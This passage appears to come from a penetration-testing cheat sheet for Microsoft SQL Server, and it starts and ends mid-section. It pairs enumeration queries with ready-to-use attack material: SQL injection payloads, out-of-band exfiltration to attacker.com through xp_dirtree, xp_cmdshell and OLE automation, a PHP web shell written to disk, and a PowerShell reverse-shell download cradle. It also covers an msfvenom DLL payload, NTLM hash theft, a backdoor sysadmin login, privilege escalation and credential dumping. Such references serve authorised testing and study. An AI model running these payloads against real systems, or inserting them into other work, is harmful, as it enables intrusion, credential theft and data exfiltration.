    WHERE type IN ('FN', 'IF', 'TF'); -- FN = Scalar Function, IF = Inline Table-Valued Function, TF = Table-Valued Function
    ```
*   **Retrieve the Definition of a Stored Procedure or Function:**

    ```sql
    USE <database_name>;
    EXEC sp_helptext '<procedure_or_function_name>';
    ```
*   **Identify Stored Procedures with Elevated Privileges:**

    ```sql
    USE <database_name>;
    SELECT name AS ProcedureName
    FROM sys.procedures
    WHERE is_ms_shipped = 0
    AND OBJECTPROPERTY(object_id, 'IsExecutionPrivileged') = 1;
    ```

**Jobs and Schedules Enumeration**

*   **List All SQL Server Jobs:**

    ```sql
    USE msdb;
    SELECT job_id, name AS JobName, enabled AS IsEnabled
    FROM sysjobs;
    ```
*   **List All Steps in a Specific Job:**

    ```sql
    USE msdb;
    SELECT step_id, step_name, command, database_name
    FROM sysjobsteps
    WHERE job_id = (SELECT job_id FROM sysjobs WHERE name = '<job_name>');
    ```
*   **List All Schedules for a Specific Job:**

    ```sql
    USE msdb;
    SELECT j.name AS JobName, s.name AS ScheduleName, 
           s.freq_type, s.freq_interval, s.freq_subday_type, 
           s.freq_subday_interval, s.active_start_date, s.active_start_time
    FROM sysjobs j
    JOIN sysjobschedules js ON j.job_id = js.job_id
    JOIN sysschedules s ON js.schedule_id = s.schedule_id
    WHERE j.name = '<job_name>';
    ```

**Linked Servers Enumeration**

*   **List All Linked Servers:**

    ```sql
    EXEC sp_linkedservers;
    ```
*   **List Details of a Specific Linked Server:**

    ```sql
    EXEC sp_helpserver '<linked_server_name>';
    ```
*   **List Logins Mapped to Linked Servers:**

    ```sql
    EXEC sp_helplinkedsrvlogin;
    ```

**Full-Text Search Enumeration**

*   **List All Full-Text Catalogs:**

    ```sql
    USE <database_name>;
    SELECT name AS CatalogName, is_default AS IsDefault, path AS CatalogPath
    FROM sys.fulltext_catalogs;
    ```
*   **List All Full-Text Indexes:**

    ```sql
    USE <database_name>;
    SELECT object_id, fulltext_index_id, is_enabled
    FROM sys.fulltext_indexes;
    ```
*   **List All Full-Text Enabled Tables:**

    ```sql
    USE <database_name>;
    SELECT object_id, name AS TableName
    FROM sys.tables
    WHERE is_fulltext_enabled = 1;
    ```

**Triggers Enumeration**

*   **List All Triggers in a Database:**

    ```sql
    USE <database_name>;
    SELECT name AS TriggerName, type_desc AS TriggerType
    FROM sys.triggers;
    ```
*   **List Triggers Associated with a Specific Table:**

    ```sql
    USE <database_name>;
    SELECT tr.name AS TriggerName, tr.is_disabled AS IsDisabled
    FROM sys.triggers tr
    JOIN sys.tables tb ON tr.parent_id = tb.object_id
    WHERE tb.name = '<table_name>';
    ```
*   **Retrieve the Definition of a Trigger:**

    ```sql
    USE <database_name>;
    EXEC sp_helptext '<trigger_name>';
    ```

**Extended Stored Procedures and DLLs Enumeration**

*   **List All Extended Stored Procedures:**

    ```sql
    USE master;
    SELECT name AS ProcedureName, dll_name AS DLLName
    FROM sys.objects
    WHERE type = 'X'; -- X = Extended Stored Procedure
    ```
*   **Identify DLLs Loaded by Extended Stored Procedures:**

    ```sql
    USE master;
    SELECT name AS ProcedureName, dll_name AS DLLName
    FROM sys.objects
    JOIN sys.extended_procedures xp ON sys.objects.object_id = xp.object_id;
    ```

**Security and Audit Logs Enumeration**

*   **List All Server-Level Audit Specifications:**

    ```sql
    SELECT name AS AuditName, is_state_enabled AS IsEnabled
    FROM sys.server_audits;
    ```
*   **List All Database Audit Specifications:**

    ```sql
    USE <database_name>;
    SELECT name AS AuditSpecificationName, is_state_enabled AS IsEnabled
    FROM sys.database_audit_specifications;
    ```
*   **Retrieve Logs from Default Trace:**

    ```sql
    SELECT *
    FROM fn_trace_gettable(CONVERT(VARCHAR(256), (SELECT TOP 1 path FROM sys.traces WHERE is_default = 1)), DEFAULT);
    ```

**Configuration and Settings Enumeration**

*   **List All Configuration Options:**

    ```sql
    EXEC sp_configure;
    ```
*   **List Advanced Configuration Options:**

    ```sql
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure;
    ```
*   **List All Server-Wide Settings:**

    ```sql
    SELECT *
    FROM sys.configurations;
    ```
*   **Identify the Authentication Mode (Windows or Mixed):**

    ```sql
    SELECT CASE SERVERPROPERTY('IsIntegratedSecurityOnly') 
                WHEN 1 THEN 'Windows Authentication'
                ELSE 'Mixed Mode Authentication'
           END AS AuthenticationMode;
    ```

**Service Account and Privilege Enumeration**

*   **Identify the SQL Server Service Account:**

    ```sql
    EXEC xp_cmdshell 'whoami';
    ```
*   **List All Service Principal Names (SPNs) Registered:**

    ```sql
    EXEC xp_cmdshell 'setspn -L <hostname>';
    ```
*   **Identify SQL Server Start-up Accounts:**

    ```sql
    SELECT servicename, service_account
    FROM sys.dm_server_services;
    ```

#### SQL Injection

**Error-Based Payloads**

*   **Version Information:** Retrieves the MSSQL version, causing a conversion error.

    ```c
    ' AND 1=CONVERT(int, @@version) -- -
    ```
*   **Database Name:** Extracts the current database name by forcing a conversion error.

    ```c
    ' AND 1=CONVERT(int, DB_NAME()) -- -
    ```
*   **Table Name Extraction:** Generates an error while attempting to retrieve the first table name.

    ```c
    ' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')) -- -
    ```
*   **Data Type Mismatch:** Forces a type mismatch error by trying to convert a string to an integer.

    ```c
    ' AND 1=CONVERT(int, 'A') -- -
    ```

**Union-Based SQLi**

*   **Database Version:** Retrieves the SQL Server version.

    ```c
    ' UNION SELECT NULL, @@version -- -
    ```
*   **Database Name:** Extracts the current database name.

    ```c
    ' UNION SELECT NULL, DB_NAME() -- -
    ```
*   **Table Name Enumeration:** Lists the names of all user-defined tables.

    ```c
    ' UNION SELECT NULL, name FROM sysobjects WHERE xtype='U' -- -
    ```
*   **Column Name Enumeration:** Retrieves the column names for a specified table.

    ```c
    ' UNION SELECT NULL, name FROM syscolumns WHERE id=OBJECT_ID('users') -- -
    ```
*   **User Data Extraction:** Extracts usernames and passwords from the `users` table.

    ```c
    ' UNION SELECT NULL, username, password FROM users -- -
    ```

**Boolean-Based SQLi**

*   **Checking MSSQL Version:** Evaluates to true if the MSSQL version starts with '8'.

    ```c
    ' AND SUBSTRING(@@version, 1, 1) = '8' -- -
    ```
*   **Determining the Number of Users:** Evaluates to true if there are more than 5 users in the database.

    ```c
    ' AND (SELECT COUNT(*) FROM sysusers) > 5 -- -
    ```
*   **Checking Existence of a Table:** Evaluates to true if the `users` table exists.

    ```c
    ' AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U' AND name='users') > 0 -- -
    ```
*   **Extracting Data from a Column:** Evaluates to true if the first character of the `users` table name is 'u'.

    ```c
    ' AND (SELECT SUBSTRING(name, 1, 1) FROM sysobjects WHERE xtype='U' AND name='users') = 'u' -- -
    ```

**Time-Based SQLi**

*   **Basic Time Delay Test:** Causes the SQL Server to wait for 5 seconds. If the response is delayed, the injection point is likely vulnerable.

    ```c
    '; WAITFOR DELAY '0:0:5' -- -
    ```
*   **Conditional Time Delay:** Causes a 5-second delay if the condition `1=1` is true.

    ```c
    '; IF (1=1) WAITFOR DELAY '0:0:5' -- -
    ```
*   **Checking MSSQL Version:** Causes a 5-second delay if the MSSQL version starts with '8'.

    ```c
    '; IF (SUBSTRING(@@version, 1, 1) = '8') WAITFOR DELAY '0:0:5' -- -
    ```
*   **Checking Existence of a Table:** Causes a 5-second delay if the `users` table exists.

    ```c
    '; IF EXISTS (SELECT * FROM sysobjects WHERE xtype='U' AND name='users') WAITFOR DELAY '0:0:5' -- -
    ```
*   **Extracting Data from a Column:** Causes a 5-second delay if the first character of the `users` table name is 'u'.

    ```c
    '; IF (SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1)='u') WAITFOR DELAY '0:0:5' -- -
    ```

**Out-of-Band SQLi**

*   **DNS Exfiltration Using XP\_DIRTREE:** Causes the MSSQL server to attempt to list a directory on an attacker-controlled SMB server, leaking database names via DNS queries.

    ```c
    '; EXEC master..xp_dirtree '\\attacker.com\' + (SELECT name FROM master..sysdatabases) -- -
    ```
*   **HTTP Exfiltration Using XP\_CMD\_SHELL:** Uses the `xp_cmdshell` stored procedure to execute a PowerShell command that sends database names to the attacker's server via HTTP.

    ```c
    '; EXEC xp_cmdshell 'powershell Invoke-WebRequest -Uri http://attacker.com/?data=' + (SELECT name FROM master..sysdatabases) -- -
    ```
*   **Data Exfiltration Using OLE Automation Procedures:** Uses OLE Automation Procedures to make an HTTP GET request to an attacker-controlled server, exfiltrating the current database user.

    ```c
    '; DECLARE @obj INT;  EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @obj OUT;  EXEC sp_OAMethod @obj, 'open', NULL, 'GET', 'http://attacker.com/?user='+ (SELECT SYSTEM_USER), false;  EXEC sp_OAMethod @obj, 'send'; -- -
    ```

### Tools

#### \[\[SQSH]]

*   **Connect with Username/Password:**

    ```bash
    sqsh -S <target_ip> -U <username> -P '<password>'
    ```
*   **Connect from Linux with Windows Authentication Mechanism:**

    ```bash
    sqsh -S <target_ip> -U .[\\julio](file://julio) -P '<password>' -h
    ```

#### \[\[SQLCMD]]

*   **Connect with Username/Password:** Connects to SQL Server using SQLCMD, allowing for interactive querying.

    ```bash
    sqlcmd -S <target_ip>,<target_port> -U <username> -P '<password>'
    ```
*   **Basic Query Execution:** Executes a simple query to list all databases.

    ```bash
    sqlcmd -S <target_ip>,1433 -U sa -P '<password>' -Q "SELECT name FROM sys.databases"
    ```
*   **Backup Database:** Backs up a specified database to a file.

    ```sql
    BACKUP DATABASE [dbname] TO DISK = 'C:\backups\dbname.bak' WITH FORMAT;
    ```
*   **Restoring a Database:** Restores a database from a backup file.

    ```sql
    RESTORE DATABASE [dbname] FROM DISK = 'C:\backups\dbname.bak' WITH REPLACE;
    ```
*   **Executing SQL Script:** Executes a script file containing multiple SQL commands.

    ```bash
    sqlcmd -S <target_ip>,1433 -U sa -P '<password>' -i script.sql
    ```
*   **Bulk Data Import:** Imports data from a CSV file into a table.

    ```sql
    BULK INSERT [tablename] FROM 'C:\data\datafile.csv' WITH (FIELDTERMINATOR = ',', ROWTERMINATOR = '\n');
    ```

### Exploitation Tools

#### \[\[Metasploit]]

#### \[\[Wireshark]]

*   **Wireshark Packet Capture:**

    ```bash
    wireshark -i <interface> -f "tcp port <port>"
    ```

#### \[\[Nmap]]

*   **Basic Nmap Scan:** Scan target on specified port to verify if service is on.

    ```bash
    nmap <target_ip> -p <target_port>
    ```

#### \[\[NetCat]]

*   **Netcat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> <target_port>
    ```
*   **Netcat UDP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> <target_port> -u
    ```
*   **Execute Commands:** Execute commands on target.

    ```bash
    echo "<command>" | nc <target_ip> <target_port>
    ```
*   **Exfiltrate Data:** Exfiltrate data over specified port.

    ```bash
    nc <target_ip> <target_port> < secret_data.txt
    ```

#### \[\[SoCat Cheat Sheet]]

*   **SoCat TCP Connect:** Simple tests to verify port service is running and responding.

    ```bash
    socat - TCP:<target_ip>:<target_port>
    ```

#### \[\[HPing3 Cheat Sheet]]

*   **Send Packet:** Send TCP packet to the service. Use `-2` to send UDP packet.

    ```bash
    hping3 <target_ip> -p <target_port>
    ```

#### \[\[CrackMapExec]]

*   **Testing credentials:**

    ```bash
    crackmapexec mssql <target_ip> -d <domain> -u <username> -p '<password>'
    ```
*   **Local auth:**

    ```bash
    crackmapexec mssql <target_ip> -d <domain> -u <username> -p '<password>' --local-auth
    ```
*   **Specify Ports:**

    ```bash
    crackmapexec mssql <target_ip> -p <target_port> -d <domain> -u <username> -p '<password>'
    ```
*   **Password spraying (without brute force):** By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Useful for spraying a single password against a large user list.

    ```bash
    crackmapexec mssql <target_ip> -d <domain> -u <username_wordlist> -p '<password_wordlist>' --no-bruteforce
    ```
*   **MSSQL Privesc:** Module to privesc from standard user to DBA

    ```bash
    crackmapexec mssql <target_ip> -d <domain> -u <username> -p '<password>' -M mssql_priv
    ```
*   **Execute MSSQL command using CrackMapExec:** Execute MSSQL command

    ```bash
    crackmapexec mssql <target_ip> -d <domain> -u <username> -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
    ```
*   **Download MSSQL file:**

    ```bash
    crackmapexec mssql <target_ip> -d <domain> -u <username> -p '<password>' --get-file <source_filepath> <destination_filepath>

    crackmapexec mssql <target_ip> -d <domain> -u <username> -p '<password>' --get-file C:\\Windows\\Temp\\whoami.txt /tmp/file
    ```
*   **Upload MSSQL file:**

    ```bash
    crackmapexec mssql <target_ip> -d <domain> -u <username> -p '<password>' --put-file <source_filepath> <destination_filepath>

    crackmapexec mssql <target_ip> -d <domain> -u <username> -p '<password>' --put-file /tmp/users C:\\Windows\\Temp\\whoami.txt
    ```
*   **Execute Windows command using CrackMapExec:**

    ```bash
    crackmapexec mssql <target_ip> -d <domain> -u <username> -p '<password>' --local-auth -x 'whoami'
    ```
*   **Execute Windows PowerShell command using CrackMapExec**

    ```bash
    crackmapexec mssql <target_ip> -d <domain> -u <username> -p '<password>' -X '$PSVersionTable'
    ```

#### \[\[Impacket]]

**\[\[Impacket-MSSQLClient]]**

*   **Connect with Username/Password:**

    ```bash
    impacket-mssqlclient <username>:'<password>'@<target_ip> -p <target_port> 
    ```

#### \[\[SQLNinja]]

#### \[\[SQLMap Cheat Sheet]]

*   **Run SQLMap:** Exploiting SQL Injection vulnerabilities in web applications connected to MSSQL.

    ```bash
    sqlmap -u "http://<target_ip>/vulnerable_page.php?id=1" --dbms=mssql --dump
    ```
*   **Run SQLMap against a single target URL:**

    ```bash
    sqlmap -u "http[:]//www.target.com/vuln.php?id=1"
    ```
*   **Send data in a POST request:** (--data implies POST request)

    ```bash
    sqlmap -u "http[:]//www.target.com/vuln.php?id=1" --data="[id=1]"
    ```
*   **Change the parameter delimiter:** (& is the default)

    ```bash
    python sqlmap.py -u "http[:]//www.target.com/vuln.php?id=1" --data="[query=foobar;id=1]" --param-del="[;]"
    ```
*   **Select a random User-Agent from `./txt/user-agents.txt` and use it:**

    ```bash
    sqlmap -u "http[:]//www.target.com/vuln.php?id=1" --random-agent
    ```
*   **Provide user credentials for HTTP protocol authentication:**

    ```bash
    python sqlmap.py -u "http[:]//www.target.com/vuln.php?id=1" --auth-type [Basic] --auth-cred "[testuser:testpass]"
    ```

### Other Techniques

#### Read Local Files

*   By default, MSSQL allows file read on any file in the operating system to which the account has read access.

    ```c
    SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
    ```

    ```c
    BULK INSERT my_table FROM 'C:\path\to\file.txt' WITH (FIELDTERMINATOR = ',', ROWTERMINATOR = '\n');
    ```

    ```c
    EXEC xp_cmdshell 'type C:\path\to\file.txt';
    ```

#### Write Local Files

*   To write files using MSSQL, we need to enable `Ole Automation Procedures`, which requires admin privileges, and then execute some stored procedures to create the file:

    ```c
    1> sp_configure 'show advanced options', 1
    2> GO
    3> RECONFIGURE
    4> GO
    5> sp_configure 'Ole Automation Procedures', 1
    6> GO
    7> RECONFIGURE
    8> GO
    ```

    ```c
    1> DECLARE @OLE INT
    2> DECLARE @FileID INT
    3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
    4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
    5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
    6> EXECUTE sp_OADestroy @FileID
    7> EXECUTE sp_OADestroy @OLE
    8> GO
    ```

    ```c
    EXEC xp_cmdshell 'echo Some data > C:\path\to\file.txt';
    ```

**Using Metasploit**

*   **Metasploit:**

    ```bash
    msf> auxiliary/admin/mssql/mssql_escalate_execute_as
    ```

**Using PowerShell**

*   **PowerShell:**

    ```powershell
    Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
    Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
    ```

#### Remote Code Execution

*   MSSQL could allow you to execute scripts in Python and/or R. These will be executed by a different user than the one using xp\_cmdshell to execute commands.

    ```c
    EXEC xp_cmdshell 'powershell -command "Invoke-WebRequest -Uri http://example.com/malware.exe -OutFile C:\temp\malware.exe"';
    ```

#### Read Registry

* Microsoft SQL Server provides multiple extended stored procedures that allow you to interact with not only the network but also the file system and even the Windows Registry:

| **Regular**                  | **Instance-Aware**                     |
| ---------------------------- | -------------------------------------- |
| sys.xp\_regread              | sys.xp\_instance\_regread              |
| sys.xp\_regenumvalues        | sys.xp\_instance\_regenumvalues        |
| sys.xp\_regenumkeys          | sys.xp\_instance\_regenumkeys          |
| sys.xp\_regwrite             | sys.xp\_instance\_regwrite             |
| sys.xp\_regdeletevalue       | sys.xp\_instance\_regdeletevalue       |
| sys.xp\_regdeletekey         | sys.xp\_instance\_regdeletekey         |
| sys.xp\_regaddmultistring    | sys.xp\_instance\_regaddmultistring    |
| sys.xp\_regremovemultistring | sys.xp\_instance\_regremovemultistring |

*   **Read Registry:**

    ```c
    EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 'WorkingDirectory';
    ```
*   **Write and then read registry:**

    ```c
    EXECUTE master.sys.xp_instance_regwrite 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue', 'REG_SZ', 'Now you see me!';

    EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue';
    ```
*   **Check who can use these functions:**

    ```c
    Use master;
    EXEC sp_helprotect 'xp_regread';
    EXEC sp_helprotect 'xp_regwrite';
    ```

## Penetration Testing Techniques

### External Reconnaissance

#### Port Scanning

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 1433
    ```
* **Description:** Identifies if the target service is running on the target by scanning target port.

#### Service Enumeration

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 1433
    ```
* **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

#### MSSQL Service Enumeration

*   **Tool:** \[\[Metasploit]]

    ```bash
    use auxiliary/scanner/mssql/mssql_ping
    set RHOSTS <target_ip>
    run
    ```
* **Description:** Enumerates MSSQL instances and services running on the target.

### Initial Access

#### Exploiting Default Credentials

*   **Tool:** \[\[SQLMap Cheat Sheet]]

    ```bash
    sqlmap -u "http://<target_ip>/vulnerable.php?id=1" --dbms=mssql --batch --passwords
    ```
* **Description:** Attempts to log in using default or weak credentials to gain access to the MySQL database.

#### Exploiting SQL Injection

*   **Tool:** \[\[SQLMap Cheat Sheet]]

    ```bash
    sqlmap -u "http://<target_ip>/vulnerable_page.php?id=1" --dbms=mssql --dump
    ```
* **Description:** Exploits SQL Injection vulnerabilities to extract data from MSSQL databases.

#### \[\[Relay Attacks]]

*   **Tool:** \[\[Responder Cheat Sheet]], \[\[Impacket-NTLMRelayX Cheat Sheet]]

    ```bash
    impacket-ntlmrelayx -tf targets.txt
    sudo responder -I <interface>
    ```
* **Description:** Relay captured credentials to the target service, potentially gaining unauthorized access.

### Persistence

#### Create a SQL User Account

*   **Tool:** \[\[SQLCMD]]

    ```sql
    CREATE LOGIN persistent_user WITH PASSWORD = 'P@ssw0rd!';
    EXEC sp_addsrvrolemember 'persistent_user', 'sysadmin';
    ```
* **Description:** Add a new user with sysadmin privileges that persists across reboots.

### Credential Harvesting

#### Packet Capture

*   **Tool:** \[\[Wireshark]]

    ```bash
    wireshark -i <interface> -f "tcp port 1433"
    ```
* **Description:** Capture traffic and extract plaintext credentials.

#### Man-in-the-Middle (MITM) Attack

*   **Tool:** \[\[BetterCap Cheat Sheet]]

    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy
    ```
* **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

#### Extracting Credentials from MSSQL

*   **Tool:** \[\[SQLCMD]]

    ```sql
    SELECT name, password_hash FROM sys.sql_logins;
    ```
* **Description:** Harvest hashed passwords from the MSSQL database.

#### Extracting SQL Server Hashes

*   **Tool:** \[\[Metasploit]]

    ```bash
    use auxiliary/admin/mssql/mssql_hashdump
    set RHOSTS <target_ip>
    set USERNAME sa
    set PASSWORD <password>
    run
    ```
* **Description:** Extracts password hashes from the SQL Server, which can be cracked offline.

#### Credential Harvesting via SQL Injection

*   **Tool:** \[\[SQLMap Cheat Sheet]]

    ```sql
    sqlmap -u "http://<target_url>/vulnerable_script.php?id=1" --dbms=mssql --dump
    ```
* **Description:** Dumps user credentials from the SQL Server through an exploited SQL injection vulnerability.

### Privilege Escalation

#### Impersonate Other Users

* **Tool:** \[\[SQLCMD]]
* SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.  It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.

1.  **Verifying Current User and Role:** The returned value 0 indicates, we do not have the sysadmin role, but we can impersonate the `sa` user.

    ```c
    1> SELECT SYSTEM_USER
    2> SELECT IS_SRVROLEMEMBER('sysadmin')
    3> GO
    ```
2.  **Find users you can impersonate:** Check if the user `sa` or any other high privileged user is mentioned

    ```c
    1> SELECT distinct b.name
    2> FROM sys.server_permissions a
    3> INNER JOIN sys.server_principals b
    4> ON a.grantor_principal_id = b.principal_id
    5> WHERE a.permission_name = 'IMPERSONATE'
    6> GO
    ```
3.  **Impersonate `sa` user:** We can now execute any command as a sysadmin as the returned value 1 indicates. If you can impersonate a user, even if he isn't sysadmin, you should check if the user has access to other databases or linked servers.

    ```c
    1> USE master
    2> EXECUTE AS LOGIN = 'sa'
    3> SELECT SYSTEM_USER
    4> SELECT IS_SRVROLEMEMBER('sysadmin')
    5> GO
    ```

    **Note:** Once you are sysadmin you can impersonate any other user.
4.  **Impersonate RegUser:**

    ```c
    1> EXECUTE AS LOGIN = 'RegUser'
    2> GO
    ```
5.  **Verify you are now running as the MyUser4 login:**

    ```c
    1> SELECT SYSTEM_USER
    2> SELECT IS_SRVROLEMEMBER('sysadmin')
    ```
6.  **Change back to sa:**

    ```c
    1> REVERT
    2> GO
    ```

#### Abusing MSSQL Database Trust

* **Tool:** \[\[SQLCMD]]
* From `db_owner` to `sysadmin`. If a regular user is given the role `db_owner` over the database owned by an admin user (such as `sa`) and that database is configured as trustworthy. That user can abuse these privileges to escalate privileges because stored procedures created in there that can execute as the owner (admin).

1.  **Get owners of databases:**

    ```c
    SELECT suser_sname(owner_sid) FROM sys.databases
    ```
2.  **Find trustworthy databases:**

    ```c
    SELECT a.name,b.is_trustworthy_on
    FROM master..sysdatabases as a
    INNER JOIN sys.databases as b
    ON a.name=b.name;
    ```
3.  **Get roles over the selected database:** Look for your username as `db_owner`. If you found you are `db_owner` of a trustworthy database, you can escalate privileges.

    ```c
    USE <trustworthy_db>
    SELECT rp.name as database_role, mp.name as database_user
    from sys.database_role_members drm
    join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
    join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
    ```
4.  **Create a stored procedure to add your user to sysadmin role:**

    ```c
    USE <trustworthy_db>
    CREATE PROCEDURE sp_elevate_me
    WITH EXECUTE AS OWNER
    AS
    EXEC sp_addsrvrolemember 'USERNAME','sysadmin'
    ```
5.  **Execute stored procedure to get sysadmin role:**

    ```c
    USE <trustworthy_db>
    EXEC sp_elevate_me
    ```
6.  **Verify your user is a sysadmin:**

    ```c
    SELECT is_srvrolemember('sysadmin')
    ```

**Using Metasploit**

*   **Metasploit:**

    ```bash
    msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
    ```

**Using PowerShell**

*   **PowerShell:**

    ```powershell
    Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
    Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
    ```

#### Capture MSSQL Service Hash

* **Tool:** \[\[SQLCMD]]
* We can also steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server. You should start a SMB server to capture the hash used in the authentication (Impacket-SMBServer or Responder for example).

1.  **Capture hash:**

    ```bash
    sudo responder -I tun0
    sudo impacket-smbserver share ./ -smb2support
    msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
    ```
2.  **XP\_DIRTREE Hash Stealing:**

    ```c
    1> EXEC master..xp_dirtree '[\\10.10.110.17\share\](file://10.10.110.17/share/)'
    2> GO
    ```
3.  **XP\_SUBDIRS Hash Stealing:**

    ```c
    1> EXEC master..xp_subdirs '[\\10.10.110.17\share\](file://10.10.110.17/share/)'
    2> GO
    ```
4.  **Check who (apart sysadmins) has permissions to run those MSSQL functions with:**

    ```c
    1> Use master;
    2> EXEC sp_helprotect 'xp_dirtree';
    3> EXEC sp_helprotect 'xp_subdirs';
    4> EXEC sp_helprotect 'xp_fileexist';
    5> GO
    ```

#### Enabling `xp_cmdshell`

* **Tool:** \[\[SQLCMD]]
* `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the Policy-Based Management or by executing `sp_configure`.

1.  **Check if `xp_cmdshell` is enabled:**

    ```c
    1> SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
    2> GO
    ```
2.  **Allow advanced options to be changed:** If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges.

    ```c
    1> EXECUTE sp_configure 'show advanced options', 1
    2> GO
    ```
3.  **Update the currently configured value for advanced options:**

    ```c
    1> RECONFIGURE
    2> GO 
    ```
4.  **To enable `xp_cmdshell`:**

    ```c
    1> EXECUTE sp_configure 'xp_cmdshell', 1
    2> GO 
    ```
5.  **Update the currently configured value for this feature:**

    ```c
    1> RECONFIGURE
    2> GO
    ```
6.  **Verify `xp_cmdshell` is now enabled:**

    ```c
    1> SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
    2> GO
    ```

*   **Enable `xp_cmdshell` (One-liner):**

    ```c
    1> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
    2> GO
    ```

**`xp_cmdshell`**

1.  **Identify who (except sysadmins) can use `xp_cmdshell`:** In order to be able to execute commands it's not only necessary to have `xp_cmdshell` enabled, but also have the EXECUTE permission on the `xp_cmdshell` stored procedure.

    ```c
    1> Use master; EXEC sp_helprotect 'xp_cmdshell'
    2> GO
    ```
2.  **Execute commands using SQL syntax on MSSQL:**

    ```c
    1> xp_cmdshell 'whoami'
    2> GO
    ```
3.  **Identify service account using `xp_cmdshell`:**

    ```c
    1> EXEC master..xp_cmdshell 'whoami'
    2> GO
    ```
4.  **Bypass blacklisted "EXEC xp\_cmdshell":**

    ```c
    1> '; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net'
    ```
5.  **Get reverse shell:**

    ```c
    1> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://<target_ip>:<target_port>/<payload>") | powershell -noprofile'
    2> GO
    ```

#### DLL Hijacking

*   **Tool:** \[\[Metasploit]]

    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -f dll > evil.dll
    ```
* **Description:** Leverage DLL hijacking to execute arbitrary code with elevated privileges.

### Internal Reconnaissance

#### Enumerating Databases

*   **Tool:** \[\[SQLCMD]]

    ```sql
    SELECT name FROM sys.databases;
    ```
* **Description:** Lists all databases on the SQL Server, useful for identifying sensitive data.

#### Enumerating Users and Roles

*   **Tool:** \[\[SQLCMD]]

    ```sql
    SELECT name, type_desc FROM sys.server_principals;
    ```
* **Description:** Lists all users and their roles within SQL Server, useful for understanding access levels.

### Lateral Movement, Pivoting, and Tunnelling

#### Communicate with Linked Servers with MSSQL

* **Tool:** \[\[SQLCMD]]
* MSSQL has a configuration option called linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

1.  **Identify Linked Servers in MSSQL:**

    ```c
    1> SELECT srvname, isremote FROM sysservers
    2> GO
    ```
2.  **Interacting with Linked Servers:**

    ```c
    1> EXECUTE() AT [linked server]
    2> GO
    ```
3.  **Identify the user used for the connection and its privileges:** `1` means is a remote server, and `0` is a linked server.

    ```c
    1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
    2> GO
    ```
4.  **Enable `xp_cmdshell` on Linked Servers:** If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

    ```c
    EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
    ```
5.  **To run a single command:**

    ```c
    EXECUTE('select @@servername') AT [LOCAL.TEST.LINKED.SRV]
    ```
6.  **To run two commands:**

    ```c
    EXECUTE('xp_cmdshell ''dir''') AT [LOCAL.TEST.LINKED.SRV]
    ```
7.  **To run multiple commands at once:** Use a semicolon between each command.

    ```c
